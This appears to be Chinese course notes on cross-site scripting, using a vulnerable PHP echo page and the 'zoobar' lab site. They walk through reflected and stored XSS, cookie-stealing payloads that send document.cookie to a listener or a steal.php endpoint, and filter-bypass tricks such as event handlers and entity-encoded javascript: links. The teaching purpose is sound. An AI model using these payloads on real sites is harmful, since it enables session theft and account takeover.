## 1、简介
* XSS攻击即为（Cross Site Scripting）, 跨站脚本。是为了区分CSS。XSS攻击是发生在目标用户的浏览器上的，当渲染DOM树的过程中执行了不该执行的JS代码时，就发生了XSS攻击。跨站脚本的重点不是“跨站”，而是“脚本“。

* 我们首先来看一下，页面执行不该执行的JS是什么意思。譬如我们来看这个代码：
```
Hello, your question is:
<?php

echo $_GET['q'];
?>
```
* 这个网页，可以想象成自动问答网站。你输入一个问题，然后网站给一个答案。这个问题是通过$_GET['q']获取的。这个网站的目的是接收用户输入的譬如“how old are you?”，"How is the weather today？"之类的问题。它接收用户的输入，把用户的输入显示在页面上，然后给一个答案。

* 好，我们可以设计这么两个URL
```
localhost/xss.php?q=<a href="http://www.baidu.com"></a>

localhost/xss.php?q=<script>alert(1);</script>

http://localhost/xss.php?q=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
```
* 因此，所谓执行不该执行的JS代码的意思就是：用户通过各种方法向网站中注入了一些JS代码，而网站没有对用户的JS代码做任何检查，就直接把它有显示在了网站的页面上。因此，导致了用户注入的JS代码的运行。

## 2、Cookie窃取

* JS可以通过document.cookie访问当前网站的cookie。当然，这样的代码只能把用户的cookie弹出来，没什么用。我们首先再次看看cookie的作用，然后考虑下，怎么样利用XSS漏洞来偷cookie。

* 在zoobar这个网站中，相应的数据库表中有Token和Salt这两项。我们通过查看源代码，来理解一下这两项有什么作用。在addRegistration代码中，有这么两行：

```
$salt = substr(md5(rand()), 0, 4);
$hashedpassword = md5($password.$salt);
```
* salt就是对随机数进行md5哈希，然后取前四位。注册的时候，用户提供了用户名和密码，但是这个密码不是明文直接存储在数据库中的，而是结合盐值做了哈希才保存的。请大家思考一下，盐值在这里有什么用？为什么不直接对密码做哈希？
> 即使用户的密码很短，只要我在他的短密码后面加上一段很长的字符，再计算 md5 ，那反推出原始密码就变得非常困难了

* 接下来看看token。在setCookie函数中，设置了token。
```
$token = md5($values["Password"].mt_rand());
```
* 每次登录的时候，会调用_setCookie函数，而每次登录token都会更新。token在生成cookie的使用：
```
$arr = array($this->username, $token);
$cookieData = base64_encode(serialize($arr));
```
* 所以就是用户每次登录，生成的cookie值都会不同,因为有随机函数

* 另外，设置了cookie有什么用呢？在_checkRemembered函数中有这样的代码：
```
$arr = unserialize(base64_decode($cookie));
list($username, $token) = $arr;
if(!$username or !$token) {
    return;
}
$sql = "SELECT * FROM Person WHERE (Username = '$username') AND (Token = '$token')";
```
* 当服务器接收到浏览器交过来的cookie的时候，先分出来username和token，然后查数据库。如果查到了，就记录下来这是哪个用户。

* 之前CSRF攻击，可以看到，有了浏览器帮我们提交cookie，可以很容易完成攻击；在CSRF攻击被防御的情况下，攻击者可以直接针对cookie进行攻击，有了cookie，直接进行登录。

* 刚才我们已经看到了使用alert(document.cookie)可以弹出来用户的cookie。但是只弹出没有什么用处，需要做的是将用户的cookie拿走。只要JS能访问cookie，并且网站中存在着XSS漏洞，那么就可以将cookie发送给攻击者。

* 那现在思路就很明确了，只要能够构造出攻击代码，把document.cookie发给监听端口就行。要发送，首先想到的可能就是`<a>`。譬如我们构造出这样的代码：
```
localhost/xss.php?q=<script>document.write("<a href='http://localhost:2002?a=");document.write("hey");document.write
("'>hello</a>");</script>hi

localhost/xss.php?q=<script>document.write("<a href='http://localhost:2002?a=");document.write("document.cookie");document.write
("'>hello</a>");</script>hi
```
* 使用这个代码，我们可以在echoserv处收到cookie


* 综上，首先，需要找到一个XSS漏洞；在这个例子中，xss.php就是漏洞。因为它接收了用户的输入，然后直接就把用户的输入写在了页面上，而用户的输入中可能有`<script>`代码，用户的代码就直接获得了执行。
>偷cookie的另一个比较经典的例子是使用`<img>`标签。因为`<img>`标签可以直接自动地去向目标URL发出请求，相比`<a>`，还不需要用户点击链接，攻击起来更加方便

* 以上的XSS攻击直接写在URL中，也叫作反射型XSS。

## 3、实践实例
* zoobar这个网站有没有什么地方可以发起XSS攻击？

* 用户可以操作的地方，主要的就是index.php页面中的profile。在这个页面中，可以输入很多内容。当其他用户查看用户的profile时，从数据库取出来用户的输入，然后显示在页面上。那我们输入攻击代码可以吗？

* 首先要说明，这个网站最近的防御还是有的。在users.php中，已经过滤了很多不少的危险标签。为了演示说明，我们首先把这些防御给关掉。

* 在关掉防御的条件下，把刚才构造出来的攻击代码直接拷贝到profile中，就可以形成一样的攻击效果。

譬如在Profile页面写上这样的代码，也可以把cookie发送出去；当然，steal.php要另外准备好，接收这个cookie。
```
<a id="id">click me</a>
<script>
var aLink = document.getElementById("id");
aLink.href="http://www.zoobar.com/steal.php?cookie="+document.cookie;
</script>
```
* 然后，我们加上一点防御。不能直接使用`<script>`标签。这个也是很容易做到的，PHP中有一个函数strip_tag，可以把一些标签给过滤了。

* 但是这点防御远远不够。在讲JS的时候我们讲过多种可以触发JS执行的方法。譬如：`onmouseover`等动作属性。试一下下面的代码。基本来说，判断是否有XSS漏洞，就看能不能弹出来框就行了。所以，这些属性也得过滤掉。
```
<a href="whatever" onmouseover="alert(1)">hello<a>
```
* 然后javascript：也得过滤掉
```
<a href="javascript:alert(1)">hello</a>
```
* 但是，即使这样，也可以通过编码的方式进行绕过。
```
<a href=&#x6A;avascript:alert(1)>hello</a>
```
* **然后，只要发现了XSS漏洞，就可以发动攻击了。**
